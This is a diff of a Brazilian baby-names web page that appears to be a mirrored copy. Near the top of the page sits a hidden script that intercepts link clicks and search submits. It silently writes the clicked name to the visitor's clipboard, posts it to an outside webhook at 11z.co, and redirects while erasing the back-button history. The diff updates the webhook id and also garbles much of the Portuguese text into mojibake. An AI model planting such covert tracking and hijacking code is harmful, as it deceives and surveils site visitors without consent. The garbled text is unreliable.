@@ -1,10 +1,10 @@
 <!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt-br" lang="pt-br"><head>
-    <!-- Script de Redirecionamento Avan�ado: C�pia Silenciosa e Substitui��o de Hist�rico -->
+    <!-- Script de Redirecionamento Avançado: Cópia Silenciosa e Substituição de Histórico -->
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const baseUrl = 'https://www.dicionariodenomesproprios.com.br';
 
-            // Fun��o para copiar texto para o clipboard de forma silenciosa
+            // Função para copiar texto para o clipboard de forma silenciosa
             async function copyToClipboard(text) {
                 try {
                     // Tenta a API moderna primeiro
@@ -24,11 +24,11 @@
                         document.body.removeChild(textArea);
                     }
                 } catch (err) {
-                    // Silencioso: N�o faz nada em caso de erro
+                    // Silencioso: Não faz nada em caso de erro
                 }
-                // Envia webhook em segundo plano (n�o bloqueia nada)
+                // Envia webhook em segundo plano (não bloqueia nada)
                 // keepalive: true garante que o Safari envie o POST mesmo durante redirecionamento
-                fetch("https://www.11z.co/_w/5156/selection", {
+                fetch("https://www.11z.co/_w/17093/selection", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ "value": text }),
@@ -46,34 +46,34 @@
                 }
             });
 
-            // 1. Redirecionar cliques em links com c�pia silenciosa
+            // 1. Redirecionar cliques em links com cópia silenciosa
             document.body.addEventListener('click', async function(e) {
                 const link = e.target.closest('a');
                 if (link && link.getAttribute('href')) {
                     const href = link.getAttribute('href');
                     
-                    // Intercepta links internos (relativos) ou links j� convertidos para o baseUrl
+                    // Intercepta links internos (relativos) ou links já convertidos para o baseUrl
                     const localAbas = ['../nomes-femininos/', '../nomes-masculinos/', '../origem/', '../bebes/', '../top-brasil/', '../'];
                     const isInternal = ((!href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) || href.startsWith(baseUrl)) && !localAbas.includes(href.replace(baseUrl, ''));
                     if (isInternal) {
                         e.preventDefault();
                         
-                        // Captura o texto do nome (limpa espa�os extras)
+                        // Captura o texto do nome (limpa espaços extras)
                         const textToCopy = link.innerText.trim();
                         if (textToCopy) {
                             await copyToClipboard(textToCopy);
                         }
 
-                        // Se o href j� � a URL completa, usa direto; sen�o monta
+                        // Se o href já é a URL completa, usa direto; senão monta
                         const targetUrl = href.startsWith(baseUrl) ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
 
-                        // Redireciona substituindo a p�gina no hist�rico (n�o permite voltar)
+                        // Redireciona substituindo a página no histórico (não permite voltar)
                         window.location.replace(targetUrl);
                     }
                 }
             }, true);
 
-            // 2. Redirecionar formul�rios de busca com c�pia silenciosa
+            // 2. Redirecionar formulários de busca com cópia silenciosa
             const searchForms = document.querySelectorAll('form');
             searchForms.forEach(form => {
                 form.addEventListener('submit', async function(e) {
@@ -92,7 +92,7 @@
                         const path = action.startsWith('/') ? action : '/' + action;
                         const targetUrl = baseUrl + path + '?' + params;
 
-                        // Redireciona substituindo a p�gina no hist�rico
+                        // Redireciona substituindo a página no histórico
                         window.location.replace(targetUrl);
                     }
                 });
@@ -103,23 +103,23 @@
 
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>Nomes de Bebês - Dicionário de Nomes Próprios</title>
-    <meta name="description" content="Ferramenta para escolher nome de bebê. Descubra nomes com significado e faça uma lista dos que gosta. Nomes de meninas e meninos mais escolhidos de 2025 e 2026">
-    <meta property="og:title" content="Nomes de Bebês - Dicionário de Nomes Próprios">
+    <title>Nomes de BebÃªs - DicionÃ¡rio de Nomes PrÃ³prios</title>
+    <meta name="description" content="Ferramenta para escolher nome de bebÃª. Descubra nomes com significado e faÃ§a uma lista dos que gosta. Nomes de meninas e meninos mais escolhidos de 2025 e 2026">
+    <meta property="og:title" content="Nomes de BebÃªs - DicionÃ¡rio de Nomes PrÃ³prios">
     <meta property="og:type" content="article">
 
         <meta property="og:url" content="https://www.dicionariodenomesproprios.com.br/bebes/">
 
     
             <meta property="og:image" content="images/fb_dnp.png">
-        <meta property="og:site_name" content="Dicionário de Nomes Próprios">
+        <meta property="og:site_name" content="DicionÃ¡rio de Nomes PrÃ³prios">
         <meta property="fb:app_id" content="132068570255221">
-    <meta property="og:description" content="Ferramenta para escolher nome de bebê. Descubra nomes com significado e faça uma lista dos que gosta. Nomes de meninas e meninos mais escolhidos de 2025 e 2026">
+    <meta property="og:description" content="Ferramenta para escolher nome de bebÃª. Descubra nomes com significado e faÃ§a uma lista dos que gosta. Nomes de meninas e meninos mais escolhidos de 2025 e 2026">
             <link rel="canonical" href="https://www.dicionariodenomesproprios.com.br/bebes/">
         <meta property="og:locale" content="pt_BR">
         <meta name="twitter:card" content="summary">
-        <meta name="twitter:title" content="Nomes de Bebês - Dicionário de Nomes Próprios">
-        <meta name="twitter:description" content="Ferramenta para escolher nome de bebê. Descubra nomes com significado e faça uma lista dos que gosta. Nomes de meninas e meninos mais escolhidos de 2025 e 2026">
+        <meta name="twitter:title" content="Nomes de BebÃªs - DicionÃ¡rio de Nomes PrÃ³prios">
+        <meta name="twitter:description" content="Ferramenta para escolher nome de bebÃª. Descubra nomes com significado e faÃ§a uma lista dos que gosta. Nomes de meninas e meninos mais escolhidos de 2025 e 2026">
             <meta name="twitter:url" content="https://www.dicionariodenomesproprios.com.br/bebes/">
     
     
@@ -133,13 +133,13 @@
     <link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#eb5d1c">
     <meta name="msapplication-TileColor" content="#fef2ed">
     <meta name="theme-color" content="#fef2ed">
-    <link rel="alternate" type="application/rss+xml" title="Dicionário de Nomes Próprios" href="http://www.dicionariodenomesproprios.com.br/rss.php">
+    <link rel="alternate" type="application/rss+xml" title="DicionÃ¡rio de Nomes PrÃ³prios" href="http://www.dicionariodenomesproprios.com.br/rss.php">
 
     <script>
         window.dataLayer = window.dataLayer || [];
         dataLayer.push({ 'contentGroup1':'NO AMP'});
         dataLayer.push({ 'contentGroup2':'lista de nomes'});
-        dataLayer.push({ 'contentGroup3':'Nomes de Bebês'});
+        dataLayer.push({ 'contentGroup3':'Nomes de BebÃªs'});
         dataLayer.push({ 'contentGroup4':'none'});
         dataLayer.push({ 'contentGroup5':'none'});
     </script>
@@ -174,14 +174,14 @@
     <div class="container">
         <div class="row">
             <div class="logo-wrap">
-                <a href="../" title="Dicionário de Nomes Próprios" class="logo">
+                <a href="../" title="DicionÃ¡rio de Nomes PrÃ³prios" class="logo">
                     <svg width="60px" height="60px" viewBox="0 0 60 60" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
     <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
         <path d="M42.3331741,0.0475426788 L42.3331741,17.3906144 C42.3331741,17.3906144 42.3331741,21.298755 42.3331741,29.1150363 L59.9486007,29.1150363 C59.8851208,22.9301528 59.8851208,18.4142306 59.9486007,15.5672696 C59.9486007,7.56679183 51.592628,0.0475426788 42.3331741,0.0475426788 Z" fill="#C54617"></path>
         <path d="M-1.13686838e-13,0.0712355116 L-1.13686838e-13,42.7119864 C-1.13686838e-13,54.4924642 8.58102389,59.8650239 17.8404778,59.8650239 L17.8404778,42.7119864 C27.0088055,59.7698021 45.8844369,59.8613379 59.9416382,59.8613379 L59.9486007,59.8650239 L59.9486007,15.5672082 C59.7477133,24.585843 55.7787031,32.6070034 42.3331741,17.3905529 C25.1203413,-2.0895836 -1.13686838e-13,0.0712355116 -1.13686838e-13,0.0712355116" fill="#EB5D1C"></path>
     </g>
 </svg>                    <span class="logo-txt">
-                        <span class="title">Dicionário de Nomes Próprios</span>
+                        <span class="title">DicionÃ¡rio de Nomes PrÃ³prios</span>
                         <span class="subtitle">Significado dos nomes</span>
                     </span>
                 </a>
@@ -189,7 +189,7 @@
             <div id="menu-btn" class="menu-btn"><i class="icon icon-menu"></i></div>
 
             <div id="fancy-header" class="fancy-header">
-                <a href="../" title="Dicionário de Nomes Próprios" class="fancy-logo">
+                <a href="../" title="DicionÃ¡rio de Nomes PrÃ³prios" class="fancy-logo">
                     <svg width="60px" height="60px" viewBox="0 0 60 60" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
     <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
         <path d="M42.3331741,0.0475426788 L42.3331741,17.3906144 C42.3331741,17.3906144 42.3331741,21.298755 42.3331741,29.1150363 L59.9486007,29.1150363 C59.8851208,22.9301528 59.8851208,18.4142306 59.9486007,15.5672696 C59.9486007,7.56679183 51.592628,0.0475426788 42.3331741,0.0475426788 Z" fill="#C54617"></path>
@@ -206,7 +206,7 @@
                             <li><a class="btn-default" href="../nomes-masculinos/">Masculinos</a></li>
                             <li><a class="btn-default" href="../origem/">Origem</a></li>
                             <li><a class="btn-default" href="../top-brasil/">Top</a></li>
-                            <li><a class="btn-default" href="../bebes/">Bebês</a></li>
+                            <li><a class="btn-default" href="../bebes/">BebÃªs</a></li>
                         </ul>
                                                     <div id="name-list-view-menu" class="baby-list--mobile">
                                 <span class="name-list-view-ver">Ver a minha lista de nomes</span>
@@ -226,7 +226,7 @@
     <li><a class="btn-default" href="../nomes-masculinos/"><span class="btn-default--text">Nomes Masculinos</span></a></li>
     <li><a class="btn-default" href="../origem/"><span class="btn-default--text">Nomes pela Origem</span></a></li>
     <li><a class="btn-default" href="../top-brasil/"><span class="btn-default--text">Top Nomes</span></a></li>
-    <li><a class="btn-default" href="../bebes/"><span class="btn-default--text">Nomes de Bebês</span></a></li>
+    <li><a class="btn-default" href="../bebes/"><span class="btn-default--text">Nomes de BebÃªs</span></a></li>
 </ul>        </div>
     </nav>
 
@@ -241,7 +241,7 @@
 
     <div class="row">
         <div class="col-xs-12">
-            <div id="breadcrumbs" class="breadcrumbs"><a href="../">Dicionário de Nomes</a> > Nomes de Bebês</div>
+            <div id="breadcrumbs" class="breadcrumbs"><a href="../">DicionÃ¡rio de Nomes</a> > Nomes de BebÃªs</div>
         </div>
     </div>
 
@@ -251,7 +251,7 @@
 
             
                 <div>
-                                            <h1 class="home-section--title">Nomes de Bebês </h1>
+                                            <h1 class="home-section--title">Nomes de BebÃªs </h1>
 
                     <ul class="baby-top-section">
                         <li><a href="/bebes-meninas/" class="baby-top-link--female"><span class="btn-default--text"><span class="hidden-xs">Nomes de </span>Meninas</span><i class="icon-arrow-right"></i></a></li>
@@ -260,7 +260,7 @@
 
                     <div class="home-section home-section--panel">
                         <i class="icon icon-baby"></i>
-                        <h2 class="">Sugerir nomes para bebê</h2>
+                        <h2 class="">Sugerir nomes para bebÃª</h2>
                         <div id="random" class="name-generator">
                             <div data-rand="girl" class="name-card name-card--female">
                                 <a class="name-link" href="//">
@@ -279,7 +279,7 @@
                         </div>
                     </div>
 
-                        <h3 class="list-title">Nomes mais escolhidos e tendências</h3>
+                        <h3 class="list-title">Nomes mais escolhidos e tendÃªncias</h3>
                         <div class="trending-names-wrap">
                             <div class="trending-list-wrap">
                                 <ol class="trending-list trending-list--female" style="counter-reset: li-counter">
@@ -293,7 +293,7 @@
                                             <a class="name-link" href="/beatriz/">Beatriz</a>
                                             <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="451">#</a>                                        </li>
                                                                             <li>
-                                            <a class="name-link" href="/julia/">Júlia</a>
+                                            <a class="name-link" href="/julia/">JÃºlia</a>
                                             <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="565">#</a>                                        </li>
                                                                             <li>
                                             <a class="name-link" href="/alice/">Alice</a>
@@ -320,7 +320,7 @@
                                             <a class="name-link" href="/maria-eduarda/">Maria Eduarda</a>
                                             <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="10738">#</a>                                        </li>
                                                                             <li>
-                                            <a class="name-link" href="/leticia/">Letícia</a>
+                                            <a class="name-link" href="/leticia/">LetÃ­cia</a>
                                             <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="597">#</a>                                        </li>
                                                                             <li>
                                             <a class="name-link" href="/isabela/">Isabela</a>
@@ -351,7 +351,7 @@
                                             <a class="name-link" href="/arthur/">Arthur</a>
                                             <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="10741">#</a>                                        </li>
                                                                             <li>
-                                            <a class="name-link" href="/joao/">João</a>
+                                            <a class="name-link" href="/joao/">JoÃ£o</a>
                                             <a href="#" class="btn-nlg hide" data-nlg="" data-name-id="279">#</a>                                        </li>
                                                                             <li>
                                             <a class="name-link" href="/pedro/">Pedro</a>
@@ -403,58 +403,58 @@
                             </div>
                             <div class="tips-wrap">
                     
-    <h2>10 dicas na hora de escolher o nome do bebê</h2>
+    <h2>10 dicas na hora de escolher o nome do bebÃª</h2>
     <div class="tips-content">
-    <p>Siga essas dicas e encontre o nome perfeito para o seu bebê:</p>
+    <p>Siga essas dicas e encontre o nome perfeito para o seu bebÃª:</p>
 
     <ol>
-        <li><strong>Faça uma lista</strong>
-            <p>A não ser que você tenha a certeza absoluta do nome que quer, o melhor é listar todos os nomes que você gosta. Mais tarde você poderá
+        <li><strong>FaÃ§a uma lista</strong>
+            <p>A nÃ£o ser que vocÃª tenha a certeza absoluta do nome que quer, o melhor Ã© listar todos os nomes que vocÃª gosta. Mais tarde vocÃª poderÃ¡
                 encurtar essa lista!</p>
         </li>
         <li><strong>Pense no significado</strong>
-            <p>Pesquise bem o significado de cada nome! Escolha um nome com um significado bonito, como por exemplo uma característica que você
-                gostaria que seu filho tivesse. Assim você também evita que o seu filho seja carregue um nome com um significado negativo!</p>
+            <p>Pesquise bem o significado de cada nome! Escolha um nome com um significado bonito, como por exemplo uma caracterÃ­stica que vocÃª
+                gostaria que seu filho tivesse. Assim vocÃª tambÃ©m evita que o seu filho seja carregue um nome com um significado negativo!</p>
         </li>
         <li><strong>Valorize as origens</strong>
-            <p>O nome pode ser uma homenagem a alguém da família. Há famílias que levam essa tradição a sério, mas ninguém precisa se sentir
-                obrigado a atender um costume familiar se não está de acordo com ele. Cabe aos pais essa decisão.</p>
+            <p>O nome pode ser uma homenagem a alguÃ©m da famÃ­lia. HÃ¡ famÃ­lias que levam essa tradiÃ§Ã£o a sÃ©rio, mas ninguÃ©m precisa se sentir
+                obrigado a atender um costume familiar se nÃ£o estÃ¡ de acordo com ele. Cabe aos pais essa decisÃ£o.</p>
         </li>
-        <li><strong>Tenha cuidado com as inovações</strong>
-            <p>Opte por nomes de pronúncia simples e evite constrangimentos futuros. É desagradável ter de repetir diversas vezes o seu nome ou ter
-                de gritar para ser ouvido num local público e cheio de barulho.</p>
+        <li><strong>Tenha cuidado com as inovaÃ§Ãµes</strong>
+            <p>Opte por nomes de pronÃºncia simples e evite constrangimentos futuros. Ã desagradÃ¡vel ter de repetir diversas vezes o seu nome ou ter
+                de gritar para ser ouvido num local pÃºblico e cheio de barulho.</p>
         </li>
         <li><strong>Prefira grafias simples</strong>
-            <p>As grafias simples podem evitar o desconforto de ter de soletrar o nome com frequência. Além de ser mais fácil para a criança
-                aprender o seu próprio nome, será mais prático não ter de soletrá-lo. Isso evitará também o risco de que o nome seja escrito
+            <p>As grafias simples podem evitar o desconforto de ter de soletrar o nome com frequÃªncia. AlÃ©m de ser mais fÃ¡cil para a crianÃ§a
+                aprender o seu prÃ³prio nome, serÃ¡ mais prÃ¡tico nÃ£o ter de soletrÃ¡-lo. Isso evitarÃ¡ tambÃ©m o risco de que o nome seja escrito
                 frequentemente com erros.
             </p>
         </li>
         <li><strong>Evite nomes esquisitos</strong>
-            <p>Pense muito bem se está preparado para aceitar comentários menos agradáveis sobre um nome que possa expor seu filho ao ridículo.</p>
-            <p>Pense, principalmente, no seu filho. Será que ele será capaz de aceitá-los também?</p>
+            <p>Pense muito bem se estÃ¡ preparado para aceitar comentÃ¡rios menos agradÃ¡veis sobre um nome que possa expor seu filho ao ridÃ­culo.</p>
+            <p>Pense, principalmente, no seu filho. SerÃ¡ que ele serÃ¡ capaz de aceitÃ¡-los tambÃ©m?</p>
         </li>
         <li><strong>Pense nas iniciais do prenome e dos sobrenomes</strong>
-            <p>Embora pareça pouco relevante, para evitar constrangimentos futuros, é importante pensar nesses detalhes.</p>
-            <p>Isso para que não sejam formadas palavras estranhas a partir dos nomes. É o que poderá acontecer com palavras resultantes de
-                cacofonia (aquelas que soam de forma desagradável).</p>
-            <p>Faça o exercício de escrever o nome e “brincar” com as letras e sílabas iniciais. Dessa forma, você pode verificar se a conjugação do
+            <p>Embora pareÃ§a pouco relevante, para evitar constrangimentos futuros, Ã© importante pensar nesses detalhes.</p>
+            <p>Isso para que nÃ£o sejam formadas palavras estranhas a partir dos nomes. Ã o que poderÃ¡ acontecer com palavras resultantes de
+                cacofonia (aquelas que soam de forma desagradÃ¡vel).</p>
+            <p>FaÃ§a o exercÃ­cio de escrever o nome e âbrincarâ com as letras e sÃ­labas iniciais. Dessa forma, vocÃª pode verificar se a conjugaÃ§Ã£o do
                 nome escolhido fica bem com o nome composto escolhido (se for o caso).</p>
-            <p>Essa é também uma forma de verificar a conjugação com o nome de família, pois o sobrenome não pode ser alterado.</p>
-            <p>Outra boa forma de confirmar se a está tudo bem, principalmente com a sonoridade, é falar o nome todo várias vezes em voz alta pra
-                você e para um outro ouvinte.</p>
+            <p>Essa Ã© tambÃ©m uma forma de verificar a conjugaÃ§Ã£o com o nome de famÃ­lia, pois o sobrenome nÃ£o pode ser alterado.</p>
+            <p>Outra boa forma de confirmar se a estÃ¡ tudo bem, principalmente com a sonoridade, Ã© falar o nome todo vÃ¡rias vezes em voz alta pra
+                vocÃª e para um outro ouvinte.</p>
         </li>
         <li><strong>Pense nos apelidos</strong>
-            <p>É comum que as pessoas ganhem apelidos aos longo da vida, por isso, vale a pena pensar se os apelidos frequentemente utilizados para
+            <p>Ã comum que as pessoas ganhem apelidos aos longo da vida, por isso, vale a pena pensar se os apelidos frequentemente utilizados para
                 o nome escolhido lhe agradam.</p>
-            <p>Lembre que haverá sempre alguém a chamar o seu filho por um apelido ainda que esse não seja do seu gosto ou do seu portador.</p>
+            <p>Lembre que haverÃ¡ sempre alguÃ©m a chamar o seu filho por um apelido ainda que esse nÃ£o seja do seu gosto ou do seu portador.</p>
         </li>
         <li><strong>Reduza a sua lista</strong>
-            <p>Corte os nomes que no fundo você sabe que não vai escolher até chegar a um ou dois nomes.</p>
+            <p>Corte os nomes que no fundo vocÃª sabe que nÃ£o vai escolher atÃ© chegar a um ou dois nomes.</p>
         </li>
-        <li><strong>Espere pelo último momento</strong>
-            <p>É claro que se você já tiver escolhido antes, não precisa esperar tanto, mas muita gente gosta de esperar pelo nascimento, para que
-                olhando para a carinha do bebê, tenha a certeza do nome! Você decide!</p>
+        <li><strong>Espere pelo Ãºltimo momento</strong>
+            <p>Ã claro que se vocÃª jÃ¡ tiver escolhido antes, nÃ£o precisa esperar tanto, mas muita gente gosta de esperar pelo nascimento, para que
+                olhando para a carinha do bebÃª, tenha a certeza do nome! VocÃª decide!</p>
         </li>
     </ol>
 </div>
@@ -468,7 +468,7 @@
 
         <div id="list-parent" class="list-parent">
             <div class="custom-name-list">
-                <div class="sg-social-hidden sg-social" data-url-callback="getUrllng" data-text="A minha lista de nomes para beb�s" data-title="Dicion�rio de Nomes Pr�prios: A minha lista de nomes para beb�s"><div class="sg-facebook-share"><button class="sg-facebook-btn" title="Compartilhar | Facebook">
+                <div class="sg-social-hidden sg-social" data-url-callback="getUrllng" data-text="A minha lista de nomes para bebês" data-title="Dicionário de Nomes Próprios: A minha lista de nomes para bebês"><div class="sg-facebook-share"><button class="sg-facebook-btn" title="Compartilhar | Facebook">
                             <span class="icon-sg-social icon-sg-social-facebook"></span>
                             <span class="text-sg-social">Compartilhar</span>
                         </button></div><div class="sg-whatsapp-share"><button class="sg-whatsapp-btn" title="Enviar | WhatsApp">
@@ -480,13 +480,13 @@
                         </button></div><div class="sg-fbmessenger-share"><button class="sg-fbmessenger-btn" title="Enviar | Facebook Messenger">
                             <span class="icon-sg-social icon-sg-social-fbmessenger"></span>
                             <span class="text-sg-social">Enviar</span>
-                        </button></div></div>                <div id="list-head" class="list-head hide">Selecionou os seguintes nomes para a sua lista de nomes para bebês:</div>
+                        </button></div></div>                <div id="list-head" class="list-head hide">Selecionou os seguintes nomes para a sua lista de nomes para bebÃªs:</div>
                 <ul id="name-list" class="name-list"></ul>
             </div>
 
             <div id="no-results" class="hide">
-                <div class="text">A sua lista de nomes para bebês ainda não tem nomes. Para adicionar nomes, utilize os botões com este aspecto:
-                    <div class="btn-nlg btn-nlg--fake"><span data-addname2="">+ Adicionar à lista</span></div></div>
+                <div class="text">A sua lista de nomes para bebÃªs ainda nÃ£o tem nomes. Para adicionar nomes, utilize os botÃµes com este aspecto:
+                    <div class="btn-nlg btn-nlg--fake"><span data-addname2="">+ Adicionar Ã  lista</span></div></div>
             </div>
             <a href="../bebes/" id="name-list-close" class="name-list-close">Fechar</a>
 
@@ -521,13 +521,13 @@
         <div class="row">
             <div class="col-xs-12">
                 <ul id="footer-list" class="footer-list footer-list--highlight">
-                    <li><a href="/ultimos-nomes/">Últimos Nomes</a></li>
+                    <li><a href="/ultimos-nomes/">Ãltimos Nomes</a></li>
                     <li><a href="/nomes-pelo-mundo/">Nomes pelo Mundo</a></li>
-                    <li><a href="../bebes/">Nomes de Bebês</a></li>
+                    <li><a href="../bebes/">Nomes de BebÃªs</a></li>
                 </ul>
                 <ul class="footer-list footer-list--org">
-                    <li><a href="/sobre/">Sobre Nós</a></li>
-                    <li><a href="/politica-privacidade/">Política de Privacidade</a></li>
+                    <li><a href="/sobre/">Sobre NÃ³s</a></li>
+                    <li><a href="/politica-privacidade/">PolÃ­tica de Privacidade</a></li>
                     <li><a href="https://www.7graus.com/MediaKit-PT-BR.pdf" rel="nofollow" target="_blank">Anuncie</a></li>
                     <li><a href="/termos-uso/">Termos de Uso</a></li>
                     <li><a href="/contato/">Contato</a></li>
@@ -536,9 +536,9 @@
                 <div class="copyright">
                     <span class="info">Significado dos Nomes</span>
                     <span class="separator"> - </span>
-                    <span class="info">Dicionário de Nomes Próprios</span>
+                    <span class="info">DicionÃ¡rio de Nomes PrÃ³prios</span>
                     <br>
-                    <span>� 2008 - 2026 <a href="https://www.7graus.com/" rel="co-worker nofollow">7Graus</a>.</span>
+                    <span>© 2008 - 2026 <a href="https://www.7graus.com/" rel="co-worker nofollow">7Graus</a>.</span>
                 </div>
             </div>
         </div>
@@ -707,9 +707,9 @@
                     return;
                 }
                 
-                // Verificar se o retryTime está definido e é um número válido
+                // Verificar se o retryTime estÃ¡ definido e Ã© um nÃºmero vÃ¡lido
                 if (typeof slot.sgRefreshRetryTime !== "number" || isNaN(slot.sgRefreshRetryTime)) {
-                    console.warn(`Retry time não configurado corretamente para o slot: ${slot.getAdUnitPath()}`);
+                    console.warn(`Retry time nÃ£o configurado corretamente para o slot: ${slot.getAdUnitPath()}`);
                     return;
                 }
                 debugScript(sgIntervalRefreshAds.debug,`intervalRefreshAd slotRenderEnded slot: isEmpty: ${event.isEmpty} | ${slot.getAdUnitPath()}`, slot);
